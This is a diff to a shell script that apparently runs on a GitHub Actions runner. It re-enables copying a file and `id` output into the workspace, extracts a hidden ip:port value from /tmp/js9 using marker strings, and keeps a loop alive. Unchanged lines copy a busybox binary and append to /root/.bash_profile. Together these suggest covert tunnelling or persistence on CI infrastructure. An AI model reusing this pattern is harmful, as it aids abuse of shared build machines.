@@ -19,21 +19,24 @@ cp /home/runner/work/nc_test/nc_test/busybox.bin  .;
 sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 
-# [ ! -z ${GITHUB_WORKSPACE} ] &&(
+[ ! -z ${GITHUB_WORKSPACE} ] &&(
   
-#   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
-#   id>$GITHUB_WORKSPACE/package/d2023.txt;
-#   uptime>$GITHUB_WORKSPACE/d2023.txt;
-#   #date>$GITHUB_WORKSPACE/dist/d2023.txt;
-#   sudo mkdir -pv  $GITHUB_WORKSPACE/package;
-#   sudo mkdir -pv  $GITHUB_WORKSPACE/dist;
+  cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
+  id>$GITHUB_WORKSPACE/package/d2023.txt;
+  uptime>$GITHUB_WORKSPACE/d2023.txt;
+  #date>$GITHUB_WORKSPACE/dist/d2023.txt;
+  sudo mkdir -pv  $GITHUB_WORKSPACE/package;
+  sudo mkdir -pv  $GITHUB_WORKSPACE/dist;
 
-# )
+)
 
 
 [ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
 
- 
+ip_port7pxy2=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
+echo "flag_9832q";
+
+
 (while true; do
         [ ! -f /tmp/keepalive ] && break        
          num61z=$(date +%S);
